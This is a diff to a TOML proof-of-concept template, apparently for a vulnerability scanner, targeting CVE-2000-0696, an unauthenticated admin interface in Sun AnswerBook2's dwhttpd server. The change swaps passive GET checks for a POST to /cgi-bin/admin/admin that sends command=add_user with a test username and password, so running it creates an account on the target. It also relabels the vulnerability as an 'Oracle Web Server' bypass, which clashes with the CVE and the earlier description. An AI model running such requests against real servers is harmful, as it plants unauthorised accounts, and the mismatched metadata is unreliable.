@@ -1,16 +1,10 @@
 [info]
-author = "AVE"
-description = "检测 Sun Solaris AnswerBook2 dwhttpd Web 服务器管理接口是否存在未授权访问漏洞。远程攻击者无需认证即可直接调用 admin CGI 脚本添加管理员账户。"
+author = "ave"
+description = "PoC/EXP for verification"
 id = "POC-AVE-2000-0546"
-name = "Sun AnswerBook2 dwhttpd 管理接口未授权访问 PoC"
+name = "Oracle Web Server /cgi-bin/admin/admin 认证绕过 PoC"
 severity = "high"
-tags = [
-    "cve-2000-0696",
-    "answerbook2",
-    "dwhttpd",
-    "solaris",
-    "unauth",
-]
+tags = ["cve-2000-0696"]
 vuln_id = [
     "CVE-2000-0696",
     "AVE-2000-0546",
@@ -21,30 +15,29 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cgi-bin/admin"
+path = "/{{BaseURL}}/cgi-bin/admin/admin"
 protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "AnswerBook2",
-    "admin",
-    "Administration",
-]
+status = [200]
+type = "status"
 
 [[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/admin"
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/admin/admin"
 protocol = "http"
+
+[poc.requests.body]
+content = "command=add_user&username=test&password=test"
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "AnswerBook2",
-    "admin",
-    "Administration",
+    "success",
+    "added",
+    "User",
 ]
